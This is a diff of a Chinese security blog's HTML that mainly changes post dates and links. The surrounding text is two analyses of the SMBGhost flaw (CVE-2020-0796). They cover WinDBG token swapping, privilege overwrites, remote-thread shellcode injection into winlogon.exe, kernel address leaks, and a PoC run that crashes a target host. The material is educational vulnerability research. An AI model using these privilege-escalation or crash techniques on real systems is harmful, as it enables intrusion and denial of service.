@@ -181,10 +181,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-04-28 22:44:37 / 修改时间：22:46:01" itemprop="dateCreated datePublished" datetime="2020-04-28T22:44:37+08:00">2020-04-28</time>
+              <time title="创建时间：2020-04-28 08:00:00" itemprop="dateCreated datePublished" datetime="2020-04-28T08:00:00+08:00">2020-04-28</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-05 23:27:23" itemprop="dateModified" datetime="2020-05-05T23:27:23+08:00">2020-05-05</time>
+              </span>
 
           
 
@@ -342,7 +348,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -356,7 +362,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">漏洞利用视角下的CVE-2020-0796漏洞</a>
+            <a href="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">漏洞利用视角下的CVE-2020-0796漏洞</a>
         </h2>
 
         <div class="post-meta">
@@ -365,10 +371,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-04-28 22:37:35 / 修改时间：22:42:07" itemprop="dateCreated datePublished" datetime="2020-04-28T22:37:35+08:00">2020-04-28</time>
+              <time title="创建时间：2020-04-21 08:00:00" itemprop="dateCreated datePublished" datetime="2020-04-21T08:00:00+08:00">2020-04-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-05 23:25:41" itemprop="dateModified" datetime="2020-05-05T23:25:41+08:00">2020-05-05</time>
+              </span>
 
           
 
@@ -385,11 +397,11 @@
 <p>各位“蓝颜知己”我们又见面了，本文是《漏洞分析视角下的CVE-2020-0796漏洞》的兄弟篇。CVE-2020-796漏洞成因已经在前文说明，这次我们从漏洞利用视角来看看CVE-2020-796漏洞。</p>
 <p>这次我们分析对象是github.com/danigargu上的本地权限提升(LPE，Local Privilege Escalation)利用(Exploit)。</p>
 <p>LPE的exploit是以C++源码形式提供的，这也有便于我们分析exploit开发原理。我们可以用Microsoft Visual Studio编译它。然后以非管理员身份运行cmd程序，执行编译后的文件cve-2020-07960local.exe。如图1所示：</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.jpg" alt="img"></p>
 <center>图1</center>
 
 <p>在exploit执行前后的whoami命令显示用户名并未改变。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.jpg" alt="img"></p>
 <center>图2</center>
 
 <p>如图2所示，而是新弹出一个cmd的界面，在其中执行whoami显示用户名已经被修改为nt authority\system</p>
@@ -407,7 +419,7 @@
 
 <p>这个Exploit要从一个特定的地址读16字节的数据，然后再写入另一个特定的地方去。</p>
 <p>根据前文的分析，此处memmove的函数，是要把数据流头部未压缩的数据，移动过来，完成预定的解压缩业务流程。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.jpg" alt="img"></p>
 <center>图3</center>
 
 <p>如图3所示，从我们抓到的流量数据来看，offset大小与memmove的size，以及数据和数据的确能匹配上。</p>
@@ -448,7 +460,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _TOKEN</span><br><span class="line">nt!_TOKEN</span><br><span class="line">  +0x000 TokenSource   : _TOKEN_SOURCE</span><br><span class="line">  +0x010 TokenId     : _LUID</span><br><span class="line">  +0x018 AuthenticationId : _LUID</span><br><span class="line">  +0x020 ParentTokenId  : _LUID</span><br><span class="line">  +0x028 ExpirationTime  : _LARGE_INTEGER</span><br><span class="line">  +0x030 TokenLock    : Ptr64 _ERESOURCE</span><br><span class="line">  +0x038 ModifiedId    : _LUID</span><br><span class="line">  +0x040 Privileges    : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">  +0x058 AuditPolicy   : _SEP_AUDIT_POLICY</span><br><span class="line">  ..</span><br></pre></td></tr></table></figure>
 
 <p>在尝试把替换cmd.exe进程的TOKEN指针之前，我们先执行一下whoami看看。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.jpg" alt="img"></p>
 <center>图4</center>
 
 <p>如图4中，whoami显示，当前账户是admin。</p>
@@ -458,7 +470,7 @@
 <p>然后把cmd.exe进程的TOKEN指针替换为system的TOKEN指针。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; eq ffff980ddcba8080+0x360 ffffd587&#96;2c606040</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.jpg" alt="img"></p>
 <center>图5</center>
 
 <p>如图5中，再执行一下whoami显示，当前账户已经由admin变化为nt authority\system。</p>
@@ -480,47 +492,47 @@
 <p>这神奇的16字节数据正是之前我们曾观察到的System进程的TOKEN中的Privileges的Present值。Present字段表示启用的特权，Enabled字段表示拥有的特权。这神奇的16字节数据覆盖写进程的Privileges结构之后，系统即拥有并启用了的system进程所有的特权。</p>
 <p>我们了解到_SEP_TOKEN_PRIVILEGES是由3个bitmap构成的结构体，通过每bit是否为1来判断进程特权的。看上去应该不会超过64种特权。</p>
 <h2 id="7-“有种贪心叫我全要”"><a href="#7-“有种贪心叫我全要”" class="headerlink" title="7 “有种贪心叫我全要”"></a>7 “有种贪心叫我全要”</h2><p>如果我们把这16字节全部用0xFF填充呢？</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.jpg" alt="img"></p>
 <center>图6</center>
 
 <p>我们使用前文所述的WinDBG手动设置了一下，如图6所示，使用whoami /PRIV命令时会提示“错误： 指定的特权不存在”。我们在微软文档中也仅发现了44中特权。</p>
 <p>我们修改了Exploit的源码，编译后执行验证，并在之前的断点停下来确认符合预期。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffff8205e32a2590, Dst&#x3D;0xffff998e11a4c6b0,Size&#x3D;16)</span><br><span class="line"></span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;ffff8205e32a2290 rbx&#x3D;ffff8205e5679150 rcx&#x3D;ffff998e11a4c6b0</span><br><span class="line">rdx&#x3D;ffff8205e32a2590 rsi&#x3D;0000000000000010 rdi&#x3D;ffff8205e32a2010</span><br><span class="line">rip&#x3D;fffff80218327f68 rsp&#x3D;ffffe8861a6f9e70 rbp&#x3D;0000000000000002</span><br><span class="line"> r8&#x3D;0000000000000010 r9&#x3D;ffff8205e4e008e0 r10&#x3D;ffff8205df002160</span><br><span class="line">r11&#x3D;ffffe8861a6f9e50 r12&#x3D;0000000000000000 r13&#x3D;ffff8205e8434680</span><br><span class="line">r14&#x3D;00000000ffffffff r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0     nv up ei ng nz na po nc</span><br><span class="line">cs&#x3D;0010 ss&#x3D;0018 ds&#x3D;002b es&#x3D;002b fs&#x3D;0053 gs&#x3D;002b       efl&#x3D;00000286</span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff802&#96;18327f68 e85376ffff   call  srv2!memcpy (fffff802&#96;1831f5c0)</span><br><span class="line"></span><br><span class="line">kd&gt; db rdx L0n16</span><br><span class="line">ffff8205&#96;e32a2590 ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff ................</span><br><span class="line"></span><br><span class="line">kd&gt; db rcx L0n16</span><br><span class="line">ffff998e&#96;11a4c6b0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.jpg" alt="img"></p>
 <center>图7</center>
 
 <p>在图7中，结果显示这并不影响Exploit的效果，</p>
 <h2 id="8-特权影响名字？"><a href="#8-特权影响名字？" class="headerlink" title="8 特权影响名字？"></a>8 特权影响名字？</h2><p>替换TOKEN不仅可以获取特权，也直接变更了账户。这个可以理解。那么问题来了，虽然修改Privileges结构，可以获得特权，但又是如何影响账户名的呢？</p>
 <p>现在我们需要来看看exploit的源码。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.jpg" alt="img"></p>
 <center>图8</center>
 
 <p>如图8中源码显示，在修改本进程的_SEP_TOKEN_PRIVILEGES结构之后，就已经获得system进程的特权，后续调用了inject()函数。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-9.jpg" alt="img"></p>
 <center>图9</center>
 
 <p>在图9中，inject()函数中通过CreateToolhelp32Snapshot()创建进程快照，使用比较进程名的方法找到”winlogon.exe”进程。然后使用VirtualAllocEx申请了一块带有可执行属性的内存（PAGE_EXECUTE_READWRITE），WriteProcessMemory把shellcode写入目标进程，CreateRemoteThread()最终完成任务。这是一个经典的远程线程注入。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-10.jpg" alt="img"></p>
 <center>图10</center>
 
 <p>图10中shellcode应该开启cmd的功能。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-11.jpg" alt="img"></p>
 <center>图11</center>
 
 <p>如图11所示，从进程树上我们能清楚的看出cmd.exe是winlogon.exe的子进程，和powershell.exe并未任何关系。</p>
 <p>winlogon.exe是以nt authority\system用户的名义启动的，而子进程继承了父进程winlogon.exe的TOKEN，也就获得了system的特权，在使用whoami命令时显示用户也就是nt authority\system。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-12.jpg" alt="img"></p>
 <center>图12</center>
 
 <p>如图12所示，选取winlogon.exe作为注入进程只是一个特例，任何以NT AUTHORITY\SYSTEM或者其他特权账户名义启动的进程都有相同的效果。</p>
 <h2 id="9-应用层获取TOKEN的地址编程技巧"><a href="#9-应用层获取TOKEN的地址编程技巧" class="headerlink" title="9 应用层获取TOKEN的地址编程技巧"></a>9 应用层获取TOKEN的地址编程技巧</h2><p>前文我们介绍了如何借助WinDBG手动修改位于内核态内存的进程的访问令牌，现在我们需要了解一下exploit如何使用编程技巧从应用层获取了TOKEN的地址的。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-13.jpg" alt="img"></p>
 <p>从源码上来看，其使用get_process_token()获取到了token在内核中的地址，然后利用CVE-2020-0796漏洞向ktoken+0x40处，即访问令牌中的_SEP_TOKEN_PRIVILEGES字段，写入了数据。</p>
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-14.jpg" alt="img"></p>
 <center>图 14</center>
 
-<p><img src="/2020/04/28/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.jpg" alt="img"></p>
+<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-15.jpg" alt="img"></p>
 <center>图 15</center>
 
 <p>在Windows上有一些众所周知的信息泄漏技巧，如本例中使用的NtQuerySystemInformation函数。这个函数有一些神奇的功能，它会返回许多内核地址。我们主要感兴趣的是此函数能够提供目前分配的每个对象的列表，使用SystemExtendedHandleInformation参数调用NtQuerySystemInformation，我们可以得到SYSTEM_HANDLE_INFORMATION_EX结构。借助此列表，我们可以使用PID和句柄获取所需对象的内核地址。</p>
@@ -551,7 +563,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">
+    <link itemprop="mainEntityOfPage" href="http://www.stxletto.com/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -565,7 +577,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">漏洞分析视角下的CVE-2020-0796漏洞</a>
+            <a href="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">漏洞分析视角下的CVE-2020-0796漏洞</a>
         </h2>
 
         <div class="post-meta">
@@ -575,14 +587,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-04-27 22:09:23" itemprop="dateCreated datePublished" datetime="2020-04-27T22:09:23+08:00">2020-04-27</time>
+              <time title="创建时间：2020-04-01 08:00:00" itemprop="dateCreated datePublished" datetime="2020-04-01T08:00:00+08:00">2020-04-01</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-04-28 23:18:08" itemprop="dateModified" datetime="2020-04-28T23:18:08+08:00">2020-04-28</time>
+                <time title="修改时间：2020-05-05 23:26:01" itemprop="dateModified" datetime="2020-05-05T23:26:01+08:00">2020-05-05</time>
               </span>
 
           
@@ -612,12 +624,12 @@
 <h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h2><p>首先我们来执行CVE-2020-0796的PoC</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\admin\CVE<span class="literal">-2020</span><span class="literal">-0796</span>\&gt; python .\poc.py <span class="number">192.168</span>.<span class="number">0.10</span></span><br><span class="line">ConnectedSent negotiate packet <span class="number">1</span></span><br><span class="line">Target responded with <span class="number">452</span> bytes</span><br><span class="line">Sent negotiate packet <span class="number">2</span></span><br><span class="line">Target responded with <span class="number">534</span> bytes</span><br><span class="line">Crash bytes sent</span><br><span class="line">winexcept timed out</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.png" alt="img"></p>
 <center>图 1</center>
 
 <p>如果目标系统未处于调试状态，我们将观察到目标设备如图1所示进入蓝屏状态。待Windows系统重启后，我们会使用WinDBG打开C:\Windows\System32\MEMORY.DMP文件，通过分析内存转储文件尝试找到触发蓝屏的原因。</p>
 <p>如果目标系统处于调试状态，将会在WinDBG中观测到如图2所示的中断：</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.png" alt="img"></p>
 <center>图 2</center>
 
 <h3 id="3-1-释放内存的错误"><a href="#3-1-释放内存的错误" class="headerlink" title="3.1 释放内存的错误"></a>3.1 释放内存的错误</h3><p>无论是任何一种情况，大多时候在WinDBG中首选执行!analyze -v，尝试由WinDBG自动分析导致问题的模块。</p>
@@ -631,33 +643,33 @@
 <p>根据函数名称字面理解或参考DDK文档ExFreePool是释放内存的函数，一般不会有什么问题。这个涉及Windows内核的Pool内存管理机制及结构。过往经验告诉我们，ExFreePool需要操作的内存结构被破坏掉了，即这可能是个Windows内核中的内存破坏漏洞(Memory Corruption)。</p>
 <p>人生终极三问：你是谁？从哪里来？到哪里去？在漏洞分析领域同样适用。</p>
 <p>为搞明白ExFreePool要释放的内存，来自哪里，又是被谁搞坏的。我们需要在IDA Pro中看看srvnet模块中的SmbCompressionDecompress函数。</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.png" alt="img"></p>
 <center>图 3</center>
 
 <p>当然如果你那边IDA Pro显示的和图3所示不同，没有这些可读性较好的变量名，而是像图4这样</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-4.png" alt="img"></p>
 <center>图 4</center>
 
 <p>也不必惊讶，后续我们会解释，如何通过公开的文档、符号文件或者数据流，注解IDA Pro函数名或者变量名，使得显示更加友好，以便开展分析工作。这个过程有点像Windows系统自带的扫雷游戏。</p>
 <p>IDA Pro显示srvnet模块中的SmbCompressionDecompress函数主要流程十分清晰：申请内存(ExAllocatePoolWithTag)、解压处理(RtlDecompressBufferEx2)、释放内存(ExFreePoolWithTag)。</p>
 <p>我们现在已知蓝屏的直接原因是释放内存的操作引起的，那么问题就显然出现在成功申请内存之后，到释放内存之间的这个过程中。我们看到这个过程中只有一个处理函数，即RtlDecompressBufferEx2。</p>
 <p>现在所有的疑点都集中在了RtlDecompressBufferEx2函数上，</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-5.png" alt="img"></p>
 <center>图 5</center>
 
 <p>我们来看看这个ntoskrnl模块中的RtlDecompressBufferEx2函数。</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-6.png" alt="img"></p>
 <center>图 6</center>
 
 <p>在图6中IDA Pro显示RtlDecompressBufferEx2函数是根据参数CompressionFormat的一个跳转函数。</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.png" alt="img"></p>
+<p><img src="/2020/04/01/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-7.png" alt="img"></p>
 <center>图 7</center>
 
 <p>RtlDecompressBufferProcs数组前2个QWORD元素为0。即当CompressionFormat取值为3时，函数最终转向RtlDecompressBufferXpressLz函数中。</p>
-<p><img src="/2020/04/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-8.png" alt="img"></p>
